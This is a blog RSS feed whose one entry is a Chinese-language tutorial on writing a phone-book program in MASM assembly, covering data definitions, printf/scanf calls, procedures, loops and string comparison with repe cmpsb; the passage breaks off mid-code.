<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>WuJ1n9 Blog</title>
    <description></description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Mon, 20 Apr 2020 15:13:39 +0800</pubDate>
    <lastBuildDate>Mon, 20 Apr 2020 15:13:39 +0800</lastBuildDate>
    <generator>Jekyll v4.0.0</generator>
    
      <item>
        <title>汇编实现电话本 Tips</title>
        <description>&lt;h1 id=&quot;汇编实现电话本-tips&quot;&gt;汇编实现电话本 Tips&lt;/h1&gt;

&lt;p&gt;之前实现了汇编程序的电话本，其中遇到很多坑和很多新知识，这里稍微总结一下，给大家提供一些思路
（完整代码见最后）&lt;/p&gt;

&lt;h2 id=&quot;0x01-data-段&quot;&gt;0x01 .data 段&lt;/h2&gt;

&lt;p&gt;.data 段会存放常量、全局变量、输入输出提示符、打印信息等&lt;/p&gt;

&lt;h3 id=&quot;换行&quot;&gt;换行&lt;/h3&gt;

&lt;p&gt;汇编中的换行符为 &lt;code class=&quot;highlighter-rouge&quot;&gt;0dh, 0ah&lt;/code&gt;，同时需要在字符串结尾添加 0&lt;/p&gt;

&lt;p&gt;例：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hello&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ah&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;World!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;Hello&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;World&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;！&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;定义常量&quot;&gt;定义常量&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;name equ &amp;lt;表达式&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;上述换行就可以简化定义成一个常量&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;endl EQU &amp;lt;0dh,0ah&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;实现输入输出&quot;&gt;实现输入输出&lt;/h2&gt;

&lt;p&gt;汇编中实现输入输出有多种方式，此处使用第三种，因为它可以方便输出更多数据类型，也更类似 C 语法&lt;/p&gt;

&lt;p&gt;1、使用 MASM 提供的 StdOut、StdIn 函数;&lt;/p&gt;

&lt;p&gt;2、使用系统 API:&lt;/p&gt;

&lt;p&gt;3、使用微软 C 标准库 msvcrt.dll 中的 crt_printf、crt_scanf 函数.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.dbgpro.com/archives/2890.html&quot;&gt;Win32汇编入门教程03控制台下的几种输出方式&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;输出&quot;&gt;输出&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;在 .data 段中定义要输出的字符串&lt;/li&gt;
  &lt;li&gt;在 .code 段中调用函数&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;例：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;szShowMenu&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;电话本 V1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
		&lt;span class=&quot;s2&quot;&gt;&quot;1. 添加数据&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;s2&quot;&gt;&quot;2. 显示数据&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;s2&quot;&gt;&quot;3. 查找数据&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;s2&quot;&gt;&quot;4. 删除数据&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;s2&quot;&gt;&quot;5. 修改数据&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;s2&quot;&gt;&quot;6. 退出程序&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;s2&quot;&gt;&quot;请输入选项: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szInputNum&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;将字符串地址压入栈中&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;			&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;调用函数&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;				&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;平栈&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;或者&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szInputNum&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge033uqvx0j30gs0a4q3t.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;输入&quot;&gt;输入&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;在 .data 段定义格式化字符串&lt;/li&gt;
  &lt;li&gt;在 .code 段调用函数&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;例：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;str_format_int&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt;	&lt;span class=&quot;s2&quot;&gt;&quot;%c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;用于保存菜单的选项&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;定义存放输入的变量&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取用户的输入&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;存放输入的变量地址&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_format_int&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;格式化字符的地址&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;此处表示获取一个字符&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_scanf&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;有两个参数&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;需要平衡&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;字节&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x02-汇编中的函数&quot;&gt;0x02 汇编中的函数&lt;/h2&gt;

&lt;p&gt;任何非 demo 都建议使用函数来增强代码复用和可读性，汇编中定义函数需要 使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;proc&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;endp&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;Func1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;Func1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endp&lt;/span&gt;
	
	&lt;span class=&quot;nb&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Func1&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endp&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;main&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge0558ggrfj31dm0u0778.jpg&quot; alt=&quot;image-20200420120643558&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x03-循环&quot;&gt;0x03 循环&lt;/h2&gt;

&lt;p&gt;汇编中循环多用 &lt;code class=&quot;highlighter-rouge&quot;&gt;标号&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;loop&lt;/code&gt; 实现，也可以使用伪代码，但限制太多比较难实现复杂的循环&lt;/p&gt;

&lt;p&gt;例：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val1&lt;/span&gt;                 			&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;把变量复制到&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;EAX&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;beginwhile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val2&lt;/span&gt;                  &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;如果非&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val2&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;jnl&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;endwhile&lt;/span&gt;               &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;退出循环&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;inc&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;                     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;dec&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;val2&lt;/span&gt;                    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;beginwhile&lt;/span&gt;              &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;重复循环&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;endwhile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;val1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;                &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;保存&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;的新值&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;http://c.biancheng.net/view/3579.html&quot;&gt;使用汇编语言实现WHILE循环&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x04-实现数组遍历查询功能&quot;&gt;0x04 实现数组遍历（查询功能）&lt;/h2&gt;

&lt;p&gt;实现数组遍历，即找到对应数组信息是非常重要的功能，除了查询，删除和修改都要用到这个功能&lt;/p&gt;

&lt;h3 id=&quot;repe-cmpsb-指令解析&quot;&gt;repe cmpsb 指令解析&lt;/h3&gt;

&lt;p&gt;repe 是一个串操作前缀，它重复串操作指令，每重复一次 ECX 的值就减一
一直到 CX 为 0 或 ZF 为 0 时停止。&lt;/p&gt;

&lt;p&gt;cmpsb 是字符串比较指令，把 ESI 指向的数据与 EDI 指向的数一个一个的进行比较。如果两个字符相等，即 ZF 为 1，当不相等时 ZF 为 0&lt;/p&gt;

&lt;p&gt;当 repe cmpsb 配合使用时就是实现字符串比较，当相同时继续比较，不同时（ZF = 0）停止比较&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nx&quot;&gt;start_for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jnb&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;info_output&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取结构体的大小&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;相当于计数器&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;计算&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;的偏移&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取数组首地址&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TeleContacts&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;计算对应下标&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;元素的首地址&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;里存放我们输入的想要查询的字符串&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;这里是要进行对比的第&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;个数组的字符串&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;设定最长对比长度&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;比较&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;和&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;里存的字符串&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;repe&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmpsb&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;不相等就进入下一次循环&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;（&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;此时&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ZF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jnz会跳转&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;）&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;next_for&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;相等就打印信息&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xxx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;略&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;next_for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
